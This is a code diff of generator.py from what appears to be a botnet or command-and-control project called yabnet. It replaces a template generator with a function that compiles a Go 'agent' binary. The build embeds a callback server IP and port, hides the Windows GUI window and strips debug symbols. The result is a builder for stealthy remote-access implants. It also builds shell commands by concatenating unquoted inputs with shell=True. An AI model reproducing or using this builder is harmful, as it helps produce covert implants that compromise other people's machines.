@@ -1,5 +1,6 @@
 from string import Template
 from colorama import Fore,Style
+from pathlib import Path
 import sys 
 import os
 import time
@@ -19,6 +20,12 @@ def print_red(string):
     print(Fore.RED + string + Style.RESET_ALL)
 
 def parse():
+    """
+    Description: Argumnet parser, used for when using this file with the commandline. 
+    (ex. python3 generator.py -i <ip> -p <port>)
+
+    However, the current generator.py is used inside the master.py console file. So ignore this function for now. 
+    """
     parser = argparse.ArgumentParser()
     parser.add_argument('-i', 
                         '--ip-address', 
@@ -53,71 +60,13 @@ def parse():
 
     return arguments 
 
-def generate(template, newfile, serverip, port):
-    new = ''
-
-    for line in open(template, 'rt'):
-        if '<SERVERIP>' in line:
-            new += line.replace('<SERVERIP>', serverip)
-            continue
-        elif '<PORT>' in line:
-            new += line.replace('<PORT>', port)
-            continue
-
-        new += line 
-
-    try:
-        with open(newfile, 'w') as fd:
-            fd.write(new)
-        print_green("[+] Generating agent.go successful.")
-
-    except Exception as e:
-        print_red("[-] " + str(e))
-
-# Need to implement windows freezing 
-# env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui agent.go
-# Check for agent.exe ! 
-def freeze(windows):
-    """
-    Description: Freeze (it's compiling really, but chose a wrong terminology) the .go file into an executable. 
-    Params:
-        - (bool) windows = Boolean which decides if the executable will be compiled for windows or not. 
-            True - Windows 
-            False - *Nix 
-    """
-
-    # Check if we are in windows. If so, check for GOPATH 
-    cmd = "where" if platform.system() == "Windows" else "which"
-    try:
-        subprocess.call([cmd, "go"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    except:
-        print_red("[-] Golang is not installed in this machine. Please install golang.")
-        exit()
-
-    print_green("[+] Golang is installed.")
-    print_green("[+] Using go agent to freeze and create static executable...")
-
-    if windows:
-        try:
-            print_green("[+] Windows selected. Compiling into windows executable...")
-            subprocess.Popen('env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui -o /opt/yabnet/agent/agent.exe /opt/yabnet/agent/agent.go', stderr=subprocess.PIPE, shell=True)
-            print_green("[+] Freezing was successful. Check /opt/yabnet/agent/agent.exe")
-        except Exception as e:
-            print_red("[-] " + str(e))
-            exit()
-    
-    else:
-
-        try:
-            subprocess.Popen('go build -o /opt/yabnet/agent/agent /opt/yabnet/agent/agent.go', stderr=subprocess.PIPE, shell=True)
-            print_green("[+] Freezing was successful. Check /opt/yabnet/agent/agent")
-        except Exception as e:
-            print_red("[-] " + str(e))
-            exit()
-    
-
-
+# !!! DEPRECATED !!! 
 def freeze_python():
+    """
+    Description: !!! DEPRECATED !!! 
+        Originally created for freezing python agent file using pyinstaller. However, golang agent was pretty lit. 
+        Thus this function is currently deprecated and is not used. 
+    """
     try: 
         print_green("[+] Using PyInstaller to Freeze agent_deploy. This will take some time...")
         pyinstaller = subprocess.Popen('cd /opt/yabnet/agent;pyinstaller -F "/opt/yabnet/agent/agent_deploy.py"', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -140,24 +89,70 @@ def freeze_python():
         print_red("[-] " + str(e))
         exit()
 
-def generateNfreeze(ip, port, freezeBool, windowsBool):
-    # HARDCODING FTW (shouldn't do this)
-    os.chdir('../')
-    TEMPLATE = os.getcwd() + '/agent/agent.txt'
-    NEWFILE = os.getcwd() + '/agent/agent.go'
-    #TEMPLATE = '/opt/yabnet/agent/agent.txt'
-    #NEWFILE = '/opt/yabnet/agent/agent.go'
+def goCompile(ip, port, windowsBool):
+    """
+    Description: Compile the .go file into an executable. 
+    Currently the function only provides compiling in linux and windows, both in x64 architecture. 
 
-    # Generate agent_deploy.py python file 
-    serverip = ip
-    port = port 
-    generate(TEMPLATE, NEWFILE, serverip, port)
+    Params:
+        - (str) ip = IP address for the agent to callback to 
+        - (str) port = Port address for the agent to call back to 
+        - (bool) windowsBool = Boolean telling if the agent.go needs to be compiled for windows or not 
+    """
 
-    # Freeze the agent file, if the user wants 
-    if freezeBool:
-        freeze(windowsBool)
+    currentPath = Path().resolve()
+    parentPath = str(currentPath.parent)
+    inputFile = parentPath + "/agent/agent.go"
+    outputFileLinux = parentPath + "/agent/agent"
+    outputFileWindows = parentPath + "/agent/agent.exe"
+
+    # Check if we are in windows. If so, check for GOPATH 
+    cmd = "where" if platform.system() == "Windows" else "which"
+    try:
+        subprocess.call([cmd, "go"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except:
+        print_red("[-] Golang is not installed in this machine. Please install golang.")
+        exit()
+
+    print_green("[+] Golang is installed.")
+    print_green("[+] Using go agent to freeze and create static executable...")
+
+    # Windows boolean is set. Compile for windows, with windows gui hidden. 
+    if windowsBool:
+        try:
+            print_green("[+] Windows selected. Compiling into windows executable...")
+
+            # -s, -w for stripping away debugging information. -X environment flag for setting compile-time variable (ip,port)
+            ldflag = "\"-s -w -H=windowsgui -X main.SERVERIP=" + ip + " -X main.PORT=" + port + "\""
+            shellCmd = "env GOOS=windows GOARCH=amd64 go build -ldflags=" + ldflag + ' -o ' + outputFileWindows + ' ' + inputFile
+            
+            print_green("\n[+] Using the following command ... " + shellCmd + "\n")
+            
+            subprocess.Popen(shellCmd, stderr=subprocess.PIPE, shell=True)
+            print_green("[+] Compiling was successful. Check /opt/yabnet/agent/agent.exe")
+        except Exception as e:
+            print_red("[-] " + str(e))
+            exit()
+    
+    # Compile for linux
+    else:
+        try:
+            print_green("[+] Compiling linux executable...")
+
+            # -s, -w for stripping away debugging information. -X environment flag for setting compile-time variable (ip,port)
+            ldflag = "\"-s -w -X main.SERVERIP=" + ip + " -X main.PORT=" + port + "\""
+            shellCmd = "env GOOS=linux GOARCH=amd64 go build -ldflags=" + ldflag + ' -o ' + outputFileLinux + ' ' + inputFile
+            
+            print_green("\n[+] Using the following command ... " + shellCmd + "\n")
+            
+            subprocess.Popen(shellCmd, stderr=subprocess.PIPE, shell=True)
+            print_green("[+] Compiling was successful. Check /opt/yabnet/agent/agent")
+        except Exception as e:
+            print_red("[-] " + str(e))
+            exit()
 
 """
+# ALL DEPRECATED. Do not use. 
 def main():
     # HARDCODING FTW (shouldn't do this) 
     TEMPLATE = '/opt/yabnet/agent/agent.txt'
